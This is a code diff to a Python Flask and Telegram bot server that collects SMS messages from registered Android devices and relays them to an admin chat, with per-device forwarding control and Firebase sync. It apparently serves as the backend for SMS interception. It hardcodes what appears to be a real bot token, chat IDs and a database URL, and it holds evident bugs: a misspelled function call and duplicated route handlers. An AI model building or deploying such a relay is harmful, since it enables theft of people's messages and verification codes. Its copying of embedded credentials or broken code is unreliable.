@@ -1,6 +1,7 @@
 import os
 import re
 import time
+import json
 import threading
 import requests
 from flask import Flask, request, jsonify
@@ -17,8 +18,14 @@ from telebot.types import (
 # ----------------------------------------------------
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8832238459:AAGR6_N00HtDjJv7IEdwu-y-1U2RW9VO9rk")
 ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "8753024194")
-GROUP_CHAT_ID = os.environ.get("GROUP_CHAT_ID", "")
+GROUP_CHAT_ID = os.environ.get("GROUP_CHAT_ID") or os.environ.get("GROUPCHATID") or "-1004375481014"
 RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL", "")
+FIREBASE_DATABASE_URL = os.environ.get(
+    "FIREBASE_DATABASE_URL",
+    "https://sms-tracker-6eeed-default-rtdb.asia-southeast1.firebasedatabase.app"
+)
+
+DEVICES_FILE = os.path.join(os.path.dirname(__file__), "devices.json")
 
 app = Flask(__name__)
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
@@ -26,49 +33,95 @@ bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
 # In-Memory Device Storage: deviceId -> dict
 devices = {}
 
+# File Persistence
+def load_devices_from_file():
+    try:
+        if os.path.exists(DEVICES_FILE):
+            with open(DEVICES_FILE, "r", encoding="utf-8") as f:
+                data = json.load(f)
+                devices.update(data)
+                print(f"[Storage] Loaded {len(devices)} device(s) from devices.json")
+    except Exception as e:
+        print(f"[Storage Error] Failed to load devices.json: {e}")
+
+def save_devices_to_file():
+    try:
+        with open(DEVICES_FILE, "w", encoding="utf-8") as f:
+            json.dump(devices, f, indent=2)
+    except Exception as e:
+        print(f"[Storage Error] Failed to save devices.json: {e}")
+
+# Firebase Realtime Sync
+def fetch_devices_from_firebase():
+    try:
+        url = f"{FIREBASE_DATABASE_URL.rstrip('/')}/devices.json"
+        res = requests.get(url, timeout=5)
+        if res.status_code == 200:
+            data = res.json() or {}
+            for dev_id, dev_info in data.items():
+                if isinstance(dev_info, dict) and dev_id:
+                    last_seen_ts = dev_info.get("lastSeen")
+                    if isinstance(last_seen_ts, (int, float)):
+                        last_seen_sec = last_seen_ts / 1000.0 if last_seen_ts > 100000000000 else last_seen_ts
+                    else:
+                        last_seen_sec = time.time()
+
+                    devices[dev_id] = {
+                        "deviceId": dev_id,
+                        "deviceAlias": dev_info.get("deviceAlias") or dev_info.get("model") or "Android Device",
+                        "model": dev_info.get("model", "Unknown Model"),
+                        "batteryLevel": dev_info.get("batteryLevel", -1),
+                        "isCharging": bool(dev_info.get("isCharging")),
+                        "isServiceRunning": bool(dev_info.get("isServiceRunning", True)),
+                        "isForwardingEnabled": bool(dev_info.get("isForwardingEnabled", True)),
+                        "killReason": dev_info.get("killReason", "Synced via Firebase"),
+                        "lastSeen": last_seen_sec
+                    }
+            save_devices_to_file()
+            print(f"[Firebase Sync] Synced {len(devices)} device(s) from Firebase Realtime Database")
+    except Exception as e:
+        print(f"[Firebase Sync Error] {e}")
+
+def update_device_in_firebase(dev_id, patch_data):
+    try:
+        url = f"{FIREBASE_DATABASE_URL.rstrip('/')}/devices/{dev_id}.json"
+        requests.patch(url, json=patch_data, timeout=5)
+    except Exception as e:
+        print(f"[Firebase Update Error] {e}")
+
+# Load stored devices on startup
+load_devices_from_file()
+fetch_devices_from_firebase()
+
 # ----------------------------------------------------
 # Helper Functions & Keyboards
 # ----------------------------------------------------
 def is_admin(chat_id):
     return str(chat_id).strip() == str(ADMIN_CHAT_ID).strip()
 
-def extract_and_auto_register_device(text):
-    """
-    Auto-registers device if a message in chat contains device metadata
-    (e.g., from direct TelegramSender notifications or SMS messages).
-    """
-    if not text:
-        return
+def handle_device_registration_data(data):
+    dev_id = data.get("deviceId") or data.get("device_id") or data.get("id")
+    if not dev_id:
+        return None
 
-    id_match = re.search(r"🆔\s*\*?ID:\*?\s*`?([a-zA-Z0-9_-]+)`?", text, re.IGNORECASE)
-    if not id_match:
-        return
+    existing = devices.get(dev_id, {})
+    updated_dev = {
+        "deviceId": dev_id,
+        "deviceAlias": data.get("deviceAlias") or data.get("alias") or existing.get("deviceAlias") or data.get("model") or "Android Device",
+        "model": data.get("model") or existing.get("model") or "Unknown Model",
+        "batteryLevel": int(data.get("batteryLevel", existing.get("batteryLevel", -1))),
+        "isCharging": bool(data.get("isCharging", existing.get("isCharging", False))),
+        "isServiceRunning": bool(data.get("isServiceRunning", True)),
+        "isForwardingEnabled": bool(data.get("isForwardingEnabled", True)),
+        "killReason": data.get("killReason") or existing.get("killReason", "Running smoothly"),
+        "lastSeen": time.time()
+    }
 
-    dev_id = id_match.group(1).strip()
-
-    alias_match = re.search(r"📱\s*\*?Device:\*?\s*`?([^`\n]+)`?", text, re.IGNORECASE)
-    dev_alias = alias_match.group(1).strip() if alias_match else "Android Device"
-
-    model_match = re.search(r"📲\s*\*?Model:\*?\s*`?([^`\n]+)`?", text, re.IGNORECASE)
-    dev_model = model_match.group(1).strip() if model_match else dev_alias
-
-    if dev_id not in devices:
-        devices[dev_id] = {
-            "deviceId": dev_id,
-            "deviceAlias": dev_alias,
-            "model": dev_model,
-            "batteryLevel": 100,
-            "isCharging": False,
-            "isServiceRunning": True,
-            "isForwardingEnabled": True,
-            "killReason": "Auto-registered via Telegram notification",
-            "lastSeen": time.time()
-        }
-        print(f"[Auto-Registered via Telegram Message] ID: {dev_id} | Alias: {dev_alias}")
-    else:
-        devices[dev_id]["lastSeen"] = time.time()
-        devices[dev_id]["deviceAlias"] = dev_alias
-        devices[dev_id]["model"] = dev_model
+    devices[dev_id] = updated_dev
+    save_devices_to_file()
+    update_device_in_firebase(dev_id, updated_dev)
+    print(f"[Device Registered/Updated] ID: {dev_id} | Alias: {updated_dev['deviceAlias']}")
+    return updated_dev
 
 def build_main_reply_keyboard():
     markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
@@ -81,7 +134,7 @@ def build_main_reply_keyboard():
 
 def build_device_control_message(dev):
     last_seen = dev.get("lastSeen", 0)
-    is_online = (time.time() - last_seen) < 180  # 3 minutes threshold
+    is_online = (time.time() - last_seen) < 300  # 5 minutes threshold
     live_status = "🟢 *Online & Active*" if is_online else "🔴 *Offline / Inactive*"
     fwd_status = "🟢 *ENABLED (ON)*" if dev.get("isForwardingEnabled", True) else "🔴 *DISABLED (OFF)*"
 
@@ -148,14 +201,18 @@ def build_sms_settings_keyboard(dev_id, is_fwd_on):
     return markup
 
 # ----------------------------------------------------
-# 1. FLASK HTTP ENDPOINTS
+# 1. FLASK HTTP ENDPOINTS (Multi-route support)
 # ----------------------------------------------------
 @app.route("/")
 def index():
+    if request.args.get("deviceId") or request.args.get("id"):
+        dev = handle_device_registrationData(request.args)
+        return jsonify({"success": True, "device": dev})
     return jsonify({
         "status": "online",
         "app": "SMS Forwarder Telegram Bot Server (Python)",
         "connected_devices": len(devices),
+        "firebase_url": FIREBASE_DATABASE_URL,
         "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
     })
 
@@ -167,36 +224,24 @@ def ping():
         "time_str": time.strftime("%Y-%m-%d %H:%M:%S")
     })
 
+REGISTER_ROUTES = ["/api/register-device", "/register-device", "/register", "/api/register"]
+
+for route in REGISTER_ROUTES:
+    @app.route(route, methods=["GET", "POST"])
+    def register_endpoint():
+        data = request.get_json(silent=True) or request.args.to_dict() or {}
+        dev = handle_device_registration_data(data)
+        if not dev:
+            return jsonify({"error": "deviceId is required"}), 400
+        return jsonify({"success": True, "device": dev})
+
 @app.route("/api/devices", methods=["GET"])
 def get_devices():
+    fetch_devices_from_firebase()
     return jsonify({
         "count": len(devices),
         "devices": list(devices.values())
     })
-
-@app.route("/api/register-device", methods=["POST"])
-def register_device():
-    data = request.get_json() or {}
-    dev_id = data.get("deviceId")
-    if not dev_id:
-        return jsonify({"error": "deviceId is required"}), 400
-
-    existing_alias = devices.get(dev_id, {}).get("deviceAlias")
-    new_alias = data.get("deviceAlias") or existing_alias or data.get("model") or "Android Device"
-
-    devices[dev_id] = {
-        "deviceId": dev_id,
-        "deviceAlias": new_alias,
-        "model": data.get("model", "Unknown Model"),
-        "batteryLevel": data.get("batteryLevel", -1),
-        "isCharging": bool(data.get("isCharging")),
-        "isServiceRunning": bool(data.get("isServiceRunning", True)),
-        "isForwardingEnabled": data.get("isForwardingEnabled", True),
-        "killReason": data.get("killReason", "Running smoothly"),
-        "lastSeen": time.time()
-    }
-    print(f"[Device Heartbeat/Registered] ID: {dev_id} | Alias: {new_alias}")
-    return jsonify({"success": True, "device": devices[dev_id]})
 
 @app.route("/api/forward-sms", methods=["POST"])
 def forward_sms():
@@ -215,19 +260,13 @@ def forward_sms():
     else:
         time_str = time.strftime("%Y-%m-%d %H:%M:%S")
 
-    # Auto-register device if missing
     if dev_id and dev_id not in devices:
-        devices[dev_id] = {
+        handle_device_registration_data({
             "deviceId": dev_id,
             "deviceAlias": "Android Device",
             "model": "Android Phone",
-            "batteryLevel": 100,
-            "isCharging": False,
-            "isServiceRunning": True,
-            "isForwardingEnabled": True,
-            "killReason": "Auto-registered on SMS receive",
-            "lastSeen": time.time()
-        }
+            "killReason": "Auto-registered on SMS receive"
+        })
 
     dev = devices.get(dev_id, {})
     device_name = dev.get("deviceAlias") or "Android Device"
@@ -283,10 +322,9 @@ def handle_text_messages(message):
     chat_type = message.chat.type
     text = message.text.strip()
 
-    # Extract & Auto-register device if message contains device details
-    extract_and_auto_register_device(text)
+    # Fetch latest devices from Firebase on command
+    fetch_devices_from_firebase()
 
-    # Group / Channel Discovery
     if chat_type in ['group', 'supergroup', 'channel']:
         if text.startswith('/') or 'groupid' in text.lower() or 'id' in text.lower():
             group_title = message.chat.title or "Telegram Group"
@@ -301,7 +339,6 @@ def handle_text_messages(message):
             return bot.send_message(chat_id, reply_text, parse_mode="Markdown")
         return
 
-    # Private Chat Authorization
     if not is_admin(chat_id):
         return bot.send_message(chat_id, "❌ *Unauthorized user.* Access restricted to Admin.")
 
@@ -352,11 +389,12 @@ def handle_text_messages(message):
         )
 
     if text in ["📊 Overall Status", "/info"]:
-        online_count = sum(1 for d in devices.values() if (time.time() - d.get("lastSeen", 0)) < 180)
+        online_count = sum(1 for d in devices.values() if (time.time() - d.get("lastSeen", 0)) < 300)
         status_text = (
             f"📊 *SYSTEM OVERALL STATUS*\n"
             f"━━━━━━━━━━━━━━━━━━━━━\n"
             f"🌐 *Bot Server:* 🟢 Online (Python Flask)\n"
+            f"🔥 *Firebase Realtime:* 🟢 Synced\n"
             f"📱 *Total Connected Devices:* {len(devices)}\n"
             f"🟢 *Online Devices:* {online_count}\n"
             f"🔴 *Offline Devices:* {len(devices) - online_count}\n"
@@ -402,6 +440,8 @@ def handle_rename(message):
         old_name = target_dev.get("deviceAlias", "Device")
         target_dev["deviceAlias"] = new_name
         devices[target_dev["deviceId"]] = target_dev
+        save_devices_to_file()
+        update_device_in_firebase(target_dev["deviceId"], {"deviceAlias": new_name})
 
         bot.send_message(chat_id, f"✅ Device renamed from `{old_name}` to `{new_name}`!", parse_mode="Markdown")
         bot.send_message(
@@ -419,6 +459,8 @@ def handle_callback(call):
 
     if not is_admin(chat_id):
         return bot.answer_callback_query(call.id, "❌ Unauthorized")
+
+    fetch_devices_from_firebase()
 
     if data == "dev_list":
         if not devices:
@@ -471,6 +513,9 @@ def handle_callback(call):
     elif action == "sms_on":
         dev["isForwardingEnabled"] = True
         devices[dev_id] = dev
+        save_devices_to_file()
+        update_device_in_firebase(dev_id, {"isForwardingEnabled": True})
+
         bot.edit_message_text(
             build_sms_settings_message(dev),
             chat_id,
@@ -489,6 +534,9 @@ def handle_callback(call):
     elif action == "sms_off":
         dev["isForwardingEnabled"] = False
         devices[dev_id] = dev
+        save_devices_to_file()
+        update_device_in_firebase(dev_id, {"isForwardingEnabled": False})
+
         bot.edit_message_text(
             build_sms_settings_message(dev),
             chat_id,
@@ -539,5 +587,7 @@ if __name__ == "__main__":
     if GROUP_CHAT_ID:
         print(f"👥 Group Chat ID: {GROUP_CHAT_ID}")
     print(f"🔗 External URL: {RENDER_EXTERNAL_URL}")
+    print(f"🔥 Firebase URL: {FIREBASE_DATABASE_URL}")
+    print(f"💾 Persisted Devices: {len(devices)}")
     print(f"====================================================")
     app.run(host="0.0.0.0", port=port)
